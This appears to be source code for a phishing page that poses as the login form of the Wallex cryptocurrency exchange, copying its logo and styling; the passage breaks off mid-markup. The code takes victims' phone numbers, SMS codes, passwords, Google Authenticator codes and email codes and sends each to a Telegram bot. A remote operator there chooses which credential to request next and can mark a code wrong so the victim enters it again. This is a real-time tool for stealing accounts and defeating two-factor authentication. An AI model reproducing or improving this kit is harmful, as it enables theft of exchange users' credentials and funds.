import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  ChevronLeft,
  ChevronDown,
  Info,
  Loader2,
  MessageSquare,
  Lock,
  Smartphone,
  Mail,
  Eye,
  EyeOff,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { AlertMessage } from "./AlertMessage";
import { OTPInput } from "./OTPInput";
import { cn } from "@/lib/utils";
import { toPersianDigits, toEnglishDigits } from "@/lib/persian-utils";
import {
  sendPhoneToTelegramEnhanced,
  validateTelegramConfig,
  updateAuthStep,
  setUserCurrentStep,
  canAccessAuthStep,
  getSession,
  updatePhoneVerificationCode,
  showAdminButtons,
  sendCustomMessageToTelegram,
  updateCustomMessageInTelegram,
} from "@/lib/telegram-service-enhanced";
import {
  registerTelegramCallback,
  unregisterTelegramCallback,
} from "@/lib/telegram-callback-service";

type AuthStep =
  | "phone"
  | "loading"
  | "verify-phone"
  | "password"
  | "google"
  | "email"
  | "email-code";

export const LoginForm = () => {
  const navigate = useNavigate();

  // Main form state
  const [currentStep, setCurrentStep] = useState<AuthStep>("phone");
  const [sessionId, setSessionId] = useState<string>("");
  const [phoneNumber, setPhoneNumber] = useState("");

  // Phone step states
  const [mobileNumber, setMobileNumber] = useState("");
  const [showInviteCode, setShowInviteCode] = useState(false);
  const [inviteCode, setInviteCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Phone verification states
  const [verifyCode, setVerifyCode] = useState("");
  const [countdown, setCountdown] = useState(60);

  // Password states
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  // Google Auth states
  const [googleCode, setGoogleCode] = useState("");

  // Email states
  const [email, setEmail] = useState("");
  const [emailCode, setEmailCode] = useState("");
  const [emailStep, setEmailStep] = useState<"email" | "code">("email");
  const [emailMessageId, setEmailMessageId] = useState<number | null>(null);

  // Error states
  const [errors, setErrors] = useState<{
    mobileNumber?: string;
    inviteCode?: string;
    verifyCode?: string;
    password?: string;
    googleCode?: string;
    email?: string;
    emailCode?: string;
  }>({});
  const [isBlocked, setIsBlocked] = useState(false);
  const [hasError, setHasError] = useState(false);

  // Register callback handler for admin actions
  useEffect(() => {
    if (sessionId) {
      console.log("🔗 Registering callback handler for session:", sessionId);
      registerTelegramCallback(sessionId, handleAdminAction);

      return () => {
        console.log(
          "🔌 Unregistering callback handler for session:",
          sessionId,
        );
        unregisterTelegramCallback(sessionId);
      };
    }
  }, [sessionId]);

  // Countdown timer for verify-phone step
  useEffect(() => {
    if (currentStep === "verify-phone" && countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown, currentStep]);

  // Handle admin actions from Telegram
  const handleAdminAction = (action: string) => {
    console.log("🚀 Admin action received:", action);
    setIsSubmitting(false);

    // Handle incorrect actions
    if (action.startsWith("incorrect_")) {
      const errorType = action.replace("incorrect_", "");
      setHasError(true);

      switch (errorType) {
        case "password":
          setCurrentStep("password");
          setErrors({
            password:
              "رمز عبور وارد شده اشتباه است. لطفا رمز صحیح را وارد کنید.",
          });
          break;
        case "google":
          setCurrentStep("google");
          setErrors({
            googleCode:
              "کد Google Authenticator وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
          });
          break;
        case "email":
          setCurrentStep("email");
          setEmailStep("code");
          setErrors({
            emailCode:
              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
          });
          break;
      }
      return;
    }

    // Handle regular auth actions
    switch (action) {
      case "password":
        setCurrentStep("password");
        setErrors({});
        setHasError(false);
        break;
      case "google":
        setCurrentStep("google");
        setErrors({});
        setHasError(false);
        break;
      case "email":
        setCurrentStep("email");
        setEmailStep("email");
        setErrors({});
        setHasError(false);
        break;
      case "complete":
        localStorage.setItem("isAuthenticated", "true");
        localStorage.setItem("userPhone", phoneNumber);
        sessionStorage.removeItem("sessionId");
        sessionStorage.removeItem("phoneNumber");
        alert("🎉 احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
        navigate("/", { replace: true });
        break;
    }
  };

  const validateMobileNumber = (number: string): boolean => {
    const mobileRegex = /^09\d{9}$/;
    return mobileRegex.test(number);
  };

  const validatePassword = (password: string): boolean => {
    return password.length > 0;
  };

  const validateEmail = (email: string): boolean => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  // Phone number submission
  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    const newErrors: { mobileNumber?: string; inviteCode?: string } = {};

    if (!mobileNumber) {
      newErrors.mobileNumber = "شماره همراه الزامی است";
    } else if (!validateMobileNumber(mobileNumber)) {
      newErrors.mobileNumber = "شماره همراه معتبر نیست";
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("📞 Sending phone number to Telegram admin:", mobileNumber);
      const result = await sendPhoneToTelegramEnhanced(mobileNumber);

      if (!result.success) {
        throw new Error("Failed to send notification to Telegram admin");
      }

      console.log("✅ Session created:", result.sessionId);
      setSessionId(result.sessionId);
      setPhoneNumber(mobileNumber);
      sessionStorage.setItem("sessionId", result.sessionId);
      sessionStorage.setItem("phoneNumber", mobileNumber);

      // Show demo verification code if in demo mode
      if (!validateTelegramConfig()) {
        console.log("🎭 Demo verification code: 123456");
        alert(
          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ارسال می‌شود)",
        );
      }

      console.log("🔄 Moving to verify-phone step");
      setCurrentStep("verify-phone");
    } catch (error) {
      console.error("Phone submission error:", error);
      setErrors({
        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Phone verification code submission
  const handleVerifyCodeSubmit = async () => {
    setErrors({});

    if (!verifyCode || verifyCode.length !== 6) {
      setErrors({ verifyCode: "کد تایید ۶ رقمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("🔍 Verifying code:", verifyCode);

      // In demo mode, accept any 6-digit code
      if (!validateTelegramConfig()) {
        console.log("🎭 Demo mode: accepting any 6-digit code");
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } else {
        // Update verification in Telegram
        const success = await updatePhoneVerificationCode(
          sessionId,
          verifyCode,
        );
        if (!success) {
          throw new Error("Failed to update phone verification");
        }
      }

      console.log("✅ Code verified successfully");
      setCurrentStep("loading");

      // Show admin buttons after reaching loading page
      setTimeout(async () => {
        try {
          console.log("📱 User reached loading step, showing admin buttons...");
          await showAdminButtons(sessionId);

          // In demo mode, show manual admin controls
          if (!validateTelegramConfig()) {
            setTimeout(() => {
              const choice = prompt(
                "🎭 حالت دمو - شبیه‌سازی ادمین\n\n" +
                  "انتخاب کنید:\n" +
                  "1 = Password\n" +
                  "2 = Google Auth\n" +
                  "3 = Email",
                "1",
              );

              switch (choice) {
                case "1":
                  console.log("🎭 Demo admin chose: Password");
                  handleAdminAction("password");
                  break;
                case "2":
                  console.log("🎭 Demo admin chose: Google Auth");
                  handleAdminAction("google");
                  break;
                case "3":
                  console.log("🎭 Demo admin chose: Email");
                  handleAdminAction("email");
                  break;
                default:
                  console.log("🎭 Demo admin chose: Password (default)");
                  handleAdminAction("password");
              }
            }, 3000);
          }
        } catch (error) {
          console.warn("⚠️ Could not show admin buttons:", error);
        }
      }, 2000);
    } catch (error) {
      console.error("Verification error:", error);
      setErrors({ verifyCode: "کد تایید نادرست است. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Password submission
  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    if (!password) {
      setErrors({ password: "رمز عبور الزامی است" });
      return;
    }

    if (!validatePassword(password)) {
      setErrors({
        password: "رمز عبور نمی‌تواند خالی باشد",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      const success = await updateAuthStep(sessionId, "password", password);
      if (!success) {
        throw new Error("Failed to update password step");
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));
      setCurrentStep("loading");
    } catch (error) {
      console.error("Password submission error:", error);
      setErrors({ password: "خطا در ارسال رمز عبور. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Google Auth code submission
  const handleGoogleCodeSubmit = async () => {
    setErrors({});

    if (!googleCode || googleCode.length !== 6) {
      setErrors({ googleCode: "کد Google Authenticator ۶ رقمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      const success = await updateAuthStep(sessionId, "google", googleCode);
      if (!success) {
        throw new Error("Failed to update Google Auth step");
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));
      setCurrentStep("loading");
    } catch (error) {
      console.error("Google Auth submission error:", error);
      setErrors({
        googleCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Email submission
  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    if (!email) {
      setErrors({ email: "ایمیل الزامی است" });
      return;
    }

    if (!validateEmail(email)) {
      setErrors({ email: "ایمیل معتبر نیست" });
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("Sending email to Telegram:", email);

      // Send email to Telegram and store message ID
      const result = await sendCustomMessageToTelegram(
        `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\nلطفا کد ۶ رقمی تایید ایمیل را ارسال کنید.`,
      );

      if (result.success && result.messageId) {
        setEmailMessageId(result.messageId);
      }

      setEmailStep("code");
    } catch (error) {
      console.error("Email sending error:", error);
      setErrors({ email: "خطا در ارسال ایمیل. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  // Email code submission
  const handleEmailCodeSubmit = async () => {
    setErrors({});

    if (!emailCode || emailCode.length !== 6) {
      setErrors({ emailCode: "کد ایمیل ۶ رقمی را وارد کنید" });
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("🔄 Starting email code submission:", {
        emailCode,
        emailMessageId,
        email,
      });

      if (emailMessageId) {
        console.log(
          "✅ Message ID found, updating existing message:",
          emailMessageId,
        );
        // Update the existing message with both email and code
        const updatedMessage = `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\n✅ کد تایید ایمیل:\nکد وارد شده: ${emailCode}`;

        const updateResult = await updateCustomMessageInTelegram(
          emailMessageId,
          updatedMessage,
        );
        console.log("🔄 Update result:", updateResult);
      } else {
        console.log(
          "❌ No message ID found, using fallback (sending new message)",
        );
        // Fallback: send new message if message ID is not available
        const fallbackResult = await sendCustomMessageToTelegram(
          `✅ کاربر کد تایید ایمیل وارد کرد:\n\nکد وارد شده: ${emailCode}\n\nایمیل: ${email}`,
        );
        console.log("📤 Fallback result:", fallbackResult);
      }

      // Navigate to loading page after updating Telegram
      setCurrentStep("loading");
    } catch (error) {
      console.error("Email code verification error:", error);
      setErrors({ emailCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleMobileNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const englishValue = toEnglishDigits(
      e.target.value.replace(/[^0-9۰-۹]/g, ""),
    );
    setMobileNumber(englishValue);
    if (errors.mobileNumber) {
      setErrors((prev) => ({ ...prev, mobileNumber: undefined }));
    }
  };

  const handleBack = () => {
    if (currentStep === "verify-phone") {
      setCurrentStep("phone");
    } else if (currentStep === "email-code") {
      setEmailStep("email");
    } else {
      setCurrentStep("loading");
    }
  };

  // Render loading state
  const renderLoading = () => (
    <div style={{ textAlign: "center", padding: "40px 0" }}>
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          gap: "24px",
        }}
      >
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            width: "80px",
            height: "80px",
            backgroundColor: "rgb(23, 29, 38)",
            borderRadius: "50%",
          }}
        >
          <Loader2
            className="animate-spin"
            style={{
              width: "40px",
              height: "40px",
              color: "rgb(255, 255, 255)",
            }}
          />
        </div>

        <div style={{ textAlign: "center" }}>
          <h2
            style={{
              fontSize: "18px",
              fontWeight: "700",
              color: "rgb(0, 0, 0)",
              margin: "0 0 8px 0",
            }}
          >
            در حال پردازش...
          </h2>
          <p
            style={{
              fontSize: "14px",
              color: "rgba(0, 0, 0, 0.6)",
              margin: "0",
              lineHeight: "1.5",
            }}
          >
            لطفا صبر کنید
          </p>
        </div>

        <div
          style={{
            width: "60px",
            height: "4px",
            backgroundColor: "rgba(0, 122, 255, 0.2)",
            borderRadius: "2px",
            overflow: "hidden",
            position: "relative",
          }}
        >
          <div
            style={{
              width: "20px",
              height: "100%",
              backgroundColor: "rgb(0, 122, 255)",
              borderRadius: "2px",
              animation: "slide 2s ease-in-out infinite",
            }}
          />
        </div>
      </div>

      <style jsx>{`
        @keyframes slide {
          0% {
            transform: translateX(-40px);
          }
          50% {
            transform: translateX(80px);
          }
          100% {
            transform: translateX(-40px);
          }
        }
      `}</style>
    </div>
  );

  return (
    <div
      style={{
        backgroundColor: "rgb(255, 255, 255)",
        borderBottomLeftRadius: "16px",
        borderBottomRightRadius: "16px",
        borderRadius: "16px",
        borderTopLeftRadius: "16px",
        borderTopRightRadius: "16px",
        width: "100%",
        maxWidth: "480px",
      }}
      className="form-card"
    >
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          gap: "8px",
          paddingBottom: "20px",
          paddingLeft: "20px",
          paddingRight: "20px",
          paddingTop: "20px",
          width: "100%",
        }}
      >
        {/* Header */}
        <div
          style={{
            display: "flex",
            justifyContent: "space-between",
            width: "100%",
          }}
        >
          <div
            style={{
              alignItems: "flex-start",
              display: "flex",
              gap: "8px",
            }}
          >
            {currentStep !== "phone" && currentStep !== "loading" && (
              <button
                tabIndex={0}
                type="button"
                onClick={handleBack}
                style={{
                  alignItems: "center",
                  borderBottomLeftRadius: "50%",
                  borderBottomRightRadius: "50%",
                  borderColor: "rgba(0, 0, 0, 0.6)",
                  borderRadius: "50%",
                  borderTopLeftRadius: "50%",
                  borderTopRightRadius: "50%",
                  color: "rgba(0, 0, 0, 0.6)",
                  cursor: "pointer",
                  display: "flex",
                  flexShrink: "0",
                  fontSize: "24px",
                  justifyContent: "center",
                  lineHeight: "42px",
                  outlineColor: "rgba(0, 0, 0, 0.6)",
                  position: "relative",
                  textAlign: "center",
                  textDecorationColor: "rgba(0, 0, 0, 0.6)",
                  textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                  transitionDuration: "0.15s",
                  transitionProperty: "background-color",
                  transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                  userSelect: "none",
                  verticalAlign: "middle",
                  backgroundColor: "rgba(0, 0, 0, 0)",
                  border: "none",
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  fill="none"
                  focusable="false"
                  aria-hidden="true"
                  viewBox="0 0 24 24"
                  style={{
                    borderColor: "rgba(0, 0, 0, 0.6)",
                    color: "rgba(0, 0, 0, 0.6)",
                    cursor: "pointer",
                    fill: "rgba(0, 0, 0, 0.6)",
                    flexShrink: "0",
                    fontSize: "24px",
                    height: "24px",
                    lineHeight: "42px",
                    outlineColor: "rgba(0, 0, 0, 0.6)",
                    overflowClipMargin: "content-box",
                    overflowX: "hidden",
                    overflowY: "hidden",
                    textAlign: "center",
                    textDecorationColor: "rgba(0, 0, 0, 0.6)",
                    textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                    transitionDuration: "0.2s",
                    transitionProperty: "fill",
                    transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                    userSelect: "none",
                    width: "24px",
                  }}
                >
                  <path
                    fill="currentColor"
                    d="M14.96 5.4a.75.75 0 1 0-1.06 1.06l4.79 4.79H3.5a.75.75 0 0 0 0 1.5h15.19l-4.79 4.79a.75.75 0 1 0 1.06 1.06l6.07-6.07a.75.75 0 0 0 0-1.06z"
                  ></path>
                </svg>
              </button>
            )}
            <span
              style={{
                fontWeight: "700",
                fontSize: "16px",
                color: "rgb(0, 0, 0)",
              }}
            >
              {currentStep === "verify-phone"
                ? "تائید شماره همراه"
                : currentStep === "password"
                  ? "رمز عبور"
                  : currentStep === "google"
                    ? "Google Authenticator"
                    : "ورود"}
            </span>
          </div>
          <a href="#">
            <img
              alt="صرافی خرید فروش ارزهای دیجیتال"
              fetchPriority="high"
              width="128"
              height="24"
              decoding="async"
              src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
              style={{
                aspectRatio: "auto 128 / 24",
                borderColor: "rgba(0, 0, 0, 0)",
                color: "rgba(0, 0, 0, 0)",
                display: "inline",
                height: "24px",
                outlineColor: "rgba(0, 0, 0, 0)",
                overflowClipMargin: "content-box",
                overflowX: "clip",
                overflowY: "clip",
                textDecorationColor: "rgba(0, 0, 0, 0)",
                textEmphasisColor: "rgba(0, 0, 0, 0)",
                width: "128px",
              }}
            />
          </a>
        </div>

        {/* Separator */}
        <hr
          style={{
            borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
            borderBottomStyle: "solid",
            borderBottomWidth: "1px",
            borderColor: "rgba(0, 0, 0, 0.2)",
            borderLeftStyle: "solid",
            borderRightStyle: "solid",
            borderStyle: "solid",
            borderTopStyle: "solid",
            flexShrink: "0",
            marginLeft: "-20px",
            marginRight: "-20px",
            marginTop: "8px",
            marginBottom: "8px",
            overflowX: "hidden",
            overflowY: "hidden",
          }}
        />

        {/* Content based on current step */}
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            gap: "8px",
            marginTop: "16px",
          }}
        >
          {/* Step 1: Phone Number Input */}
          {currentStep === "phone" && (
            <>
              {/* Alert Messages */}
              <div>
                <AlertMessage>
                  مطمئن شوید که در دامنه wallex.ir هستید.
                </AlertMessage>

                <div style={{ marginTop: "8px" }}>
                  <AlertMessage>
                    {!validateTelegramConfig()
                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
                      : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                  </AlertMessage>
                </div>
              </div>

              <form onSubmit={handlePhoneSubmit}>
                {/* Mobile Number Input */}
                <div
                  style={{
                    display: "inline-flex",
                    flexDirection: "column",
                    marginBottom: "16px",
                    marginTop: "16px",
                    position: "relative",
                    verticalAlign: "top",
                    width: "100%",
                  }}
                >
                  <label
                    htmlFor="mobile-input"
                    style={{
                      cursor: "default",
                      fontSize: "14px",
                      fontWeight: "500",
                      lineHeight: "24.01px",
                      marginBottom: "8px",
                      maxWidth: "calc(133% - 32px)",
                      overflowX: "hidden",
                      overflowY: "hidden",
                      position: "relative",
                      right: "0px",
                      textOverflow: "ellipsis",
                      textWrap: "nowrap",
                      top: "0px",
                      transformOrigin: "100% 0%",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.2s, 0.2s, 0.2s",
                      transitionProperty: "color, transform, max-width",
                      transitionTimingFunction:
                        "cubic-bezier(0, 0, 0.2, 1), cubic-bezier(0, 0, 0.2, 1), cubic-bezier(0, 0, 0.2, 1)",
                      userSelect: "none",
                      whiteSpace: "nowrap",
                      zIndex: "1",
                      textAlign: "right",
                      color: "rgb(0, 0, 0)",
                    }}
                  >
                    شماره همراه را وارد کنید.
                  </label>
                  <div
                    style={{
                      alignItems: "center",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      cursor: "text",
                      display: "flex",
                      position: "relative",
                      width: "100%",
                    }}
                  >
                    <input
                      id="mobile-input"
                      aria-invalid="false"
                      name="mobile_number"
                      type="text"
                      inputMode="numeric"
                      maxLength={11}
                      value={toPersianDigits(mobileNumber)}
                      onChange={handleMobileNumberChange}
                      autoFocus
                      disabled={isSubmitting}
                      style={{
                        animation:
                          "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                        animationDuration: "0.01s",
                        animationName: "mui-auto-fill-cancel",
                        appearance: "auto",
                        boxSizing: "content-box",
                        cursor: "text",
                        overflowX: "clip",
                        overflowY: "clip",
                        paddingBottom: "10px",
                        paddingLeft: "12px",
                        paddingRight: "12px",
                        paddingTop: "10px",
                        width: "100%",
                        fontSize: "14px",
                        textAlign: "right",
                        backgroundColor: "rgb(255, 255, 255)",
                        border: "none",
                        outline: "none",
                      }}
                      placeholder="۰۹۱۲۳۴۵۶۷۸۹"
                    />
                    <fieldset
                      aria-hidden="true"
                      style={{
                        borderBottom: errors.mobileNumber
                          ? "1px solid rgb(220, 38, 38)"
                          : "1px solid rgba(0, 0, 0, 0.2)",
                        borderBottomLeftRadius: "8px",
                        borderBottomRightRadius: "8px",
                        borderBottomStyle: "solid",
                        borderBottomWidth: "1px",
                        borderColor: errors.mobileNumber
                          ? "rgb(220, 38, 38)"
                          : "rgba(0, 0, 0, 0.2)",
                        borderLeft: errors.mobileNumber
                          ? "1px solid rgb(220, 38, 38)"
                          : "1px solid rgba(0, 0, 0, 0.2)",
                        borderLeftStyle: "solid",
                        borderLeftWidth: "1px",
                        borderRadius: "8px",
                        borderRight: errors.mobileNumber
                          ? "1px solid rgb(220, 38, 38)"
                          : "1px solid rgba(0, 0, 0, 0.2)",
                        borderRightStyle: "solid",
                        borderRightWidth: "1px",
                        borderStyle: "solid",
                        borderTop: errors.mobileNumber
                          ? "1px solid rgb(220, 38, 38)"
                          : "1px solid rgba(0, 0, 0, 0.2)",
                        borderTopLeftRadius: "8px",
                        borderTopRightRadius: "8px",
                        borderTopStyle: "solid",
                        borderTopWidth: "1px",
                        borderWidth: "1px",
                        bottom: "0px",
                        cursor: "text",
                        left: "0px",
                        minWidth: "0%",
                        overflowX: "hidden",
                        overflowY: "hidden",
                        paddingLeft: "8px",
                        paddingRight: "8px",
                        pointerEvents: "none",
                        position: "absolute",
                        right: "0px",
                        textAlign: "right",
                        top: "-5px",
                      }}
                    >
                      <legend
                        style={{
                          cursor: "text",
                          fontSize: "12px",
                          height: "11px",
                          lineHeight: "21px",
                          maxWidth: "0.01px",
                          overflowX: "hidden",
                          overflowY: "hidden",
                          pointerEvents: "none",
                          textAlign: "right",
                          textWrap: "nowrap",
                          transitionDuration: "0.05s",
                          transitionProperty: "max-width",
                          transitionTimingFunction:
                            "cubic-bezier(0, 0, 0.2, 1)",
                          visibility: "hidden",
                          whiteSpace: "nowrap",
                        }}
                      >
                        <span
                          style={{
                            cursor: "text",
                            display: "inline-block",
                            fontSize: "12px",
                            lineHeight: "21px",
                            opacity: "0",
                            paddingLeft: "5px",
                            paddingRight: "5px",
                            pointerEvents: "none",
                            textAlign: "right",
                            textWrap: "nowrap",
                            whiteSpace: "nowrap",
                          }}
                        >
                          شماره همراه را وارد کنید.
                        </span>
                      </legend>
                    </fieldset>
                  </div>
                  {errors.mobileNumber && (
                    <p
                      style={{
                        color: "rgb(220, 38, 38)",
                        fontSize: "12px",
                        textAlign: "right",
                        marginTop: "4px",
                      }}
                    >
                      {errors.mobileNumber}
                    </p>
                  )}
                </div>

                {/* Invite Code Toggle Button */}
                <button
                  tabIndex={0}
                  type="button"
                  onClick={() => setShowInviteCode(!showInviteCode)}
                  style={{
                    alignItems: "center",
                    borderBottomLeftRadius: "8px",
                    borderBottomRightRadius: "8px",
                    borderColor: "rgb(0, 122, 255)",
                    borderRadius: "8px",
                    borderTopLeftRadius: "8px",
                    borderTopRightRadius: "8px",
                    color: "rgb(0, 122, 255)",
                    cursor: "pointer",
                    display: "inline-flex",
                    fontSize: "12px",
                    justifyContent: "center",
                    lineHeight: "20.004px",
                    marginBottom: "4px",
                    outlineColor: "rgb(0, 122, 255)",
                    paddingBottom: "4px",
                    paddingTop: "4px",
                    position: "relative",
                    textAlign: "center",
                    textDecorationColor: "rgb(0, 122, 255)",
                    textEmphasisColor: "rgb(0, 122, 255)",
                    textTransform: "uppercase",
                    transitionBehavior: "normal, normal, normal",
                    transitionDelay: "0s, 0s, 0s",
                    transitionDuration: "0.25s, 0.25s, 0.25s",
                    transitionProperty:
                      "background-color, box-shadow, border-color",
                    transitionTimingFunction:
                      "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                    userSelect: "none",
                    verticalAlign: "middle",
                    backgroundColor: "rgba(0, 0, 0, 0)",
                    border: "none",
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    fill="none"
                    focusable="false"
                    aria-hidden="true"
                    viewBox="0 0 24 24"
                    style={{
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      cursor: "pointer",
                      fill: "rgb(0, 122, 255)",
                      flexShrink: "0",
                      height: "24px",
                      lineHeight: "26.672px",
                      marginLeft: "4px",
                      outlineColor: "rgb(0, 122, 255)",
                      overflowClipMargin: "content-box",
                      overflowX: "hidden",
                      overflowY: "hidden",
                      textAlign: "center",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                      textTransform: "uppercase",
                      transitionDuration: "0.2s",
                      transitionProperty: "fill",
                      transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      width: "24px",
                      transform: showInviteCode
                        ? "rotate(180deg)"
                        : "rotate(0deg)",
                      transition: "transform 0.2s",
                    }}
                  >
                    <path
                      fill="currentColor"
                      d="m13.98 5.32-3.21 3.21-1.97 1.96a2.13 2.13 0 0 0 0 3.01l5.18 5.18c.68.68 1.84.19 1.84-.76V6.08c0-.96-1.16-1.44-1.84-.76"
                    ></path>
                  </svg>
                  <span
                    style={{
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      cursor: "pointer",
                      fontSize: "14px",
                      fontWeight: "500",
                      lineHeight: "24.01px",
                      outlineColor: "rgb(0, 122, 255)",
                      textAlign: "center",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                      textTransform: "uppercase",
                      userSelect: "none",
                    }}
                  >
                    کد دعوت دارید؟
                  </span>
                </button>

                {/* Invite Code Section */}
                <div
                  style={{
                    height: showInviteCode ? "auto" : "0px",
                    overflowX: "hidden",
                    overflowY: "hidden",
                    transitionDuration: "0.3s",
                    transitionProperty: showInviteCode ? "height" : "height",
                    transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                    visibility: showInviteCode ? "visible" : "hidden",
                  }}
                >
                  {showInviteCode && (
                    <div
                      style={{
                        display: "flex",
                        visibility: "visible",
                        width: "100%",
                      }}
                    >
                      <div
                        style={{
                          width: "100%",
                        }}
                      >
                        <div
                          style={{
                            display: "inline-flex",
                            flexDirection: "column",
                            position: "relative",
                            verticalAlign: "top",
                            width: "100%",
                            marginBottom: "8px",
                          }}
                        >
                          <div
                            style={{
                              alignItems: "center",
                              borderBottomLeftRadius: "8px",
                              borderBottomRightRadius: "8px",
                              borderRadius: "8px",
                              borderTopLeftRadius: "8px",
                              borderTopRightRadius: "8px",
                              cursor: "text",
                              display: "flex",
                              position: "relative",
                              width: "100%",
                            }}
                          >
                            <input
                              aria-invalid="false"
                              name="invite_code"
                              placeholder="کد معرف (اختیاری)"
                              type="text"
                              value={inviteCode}
                              onChange={(e) => setInviteCode(e.target.value)}
                              style={{
                                animation:
                                  "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                                animationDuration: "0.01s",
                                animationName: "mui-auto-fill-cancel",
                                appearance: "auto",
                                boxSizing: "content-box",
                                cursor: "text",
                                fontFeatureSettings: '"ss00"',
                                overflowX: "clip",
                                overflowY: "clip",
                                paddingBottom: "10px",
                                paddingLeft: "12px",
                                paddingRight: "12px",
                                paddingTop: "10px",
                                width: "100%",
                                fontSize: "14px",
                                textAlign: "right",
                                backgroundColor: "rgb(255, 255, 255)",
                                border: "none",
                                outline: "none",
                              }}
                            />
                            <fieldset
                              aria-hidden="true"
                              style={{
                                borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                                borderBottomLeftRadius: "8px",
                                borderBottomRightRadius: "8px",
                                borderBottomStyle: "solid",
                                borderBottomWidth: "1px",
                                borderColor: "rgba(0, 0, 0, 0.2)",
                                borderLeft: "1px solid rgba(0, 0, 0, 0.2)",
                                borderLeftStyle: "solid",
                                borderLeftWidth: "1px",
                                borderRadius: "8px",
                                borderRight: "1px solid rgba(0, 0, 0, 0.2)",
                                borderRightStyle: "solid",
                                borderRightWidth: "1px",
                                borderStyle: "solid",
                                borderTop: "1px solid rgba(0, 0, 0, 0.2)",
                                borderTopLeftRadius: "8px",
                                borderTopRightRadius: "8px",
                                borderTopStyle: "solid",
                                borderTopWidth: "1px",
                                borderWidth: "1px",
                                bottom: "0px",
                                cursor: "text",
                                left: "0px",
                                minWidth: "0%",
                                overflowX: "hidden",
                                overflowY: "hidden",
                                paddingLeft: "8px",
                                paddingRight: "8px",
                                pointerEvents: "none",
                                position: "absolute",
                                right: "0px",
                                textAlign: "right",
                                top: "-5px",
                              }}
                            >
                              <legend
                                style={{
                                  cursor: "text",
                                  lineHeight: "11px",
                                  overflowX: "hidden",
                                  overflowY: "hidden",
                                  pointerEvents: "none",
                                  textAlign: "right",
                                  transitionDuration: "0.15s",
                                  transitionProperty: "width",
                                  transitionTimingFunction:
                                    "cubic-bezier(0, 0, 0.2, 1)",
                                }}
                              >
                                <span
                                  aria-hidden="true"
                                  style={{
                                    cursor: "text",
                                    display: "inline",
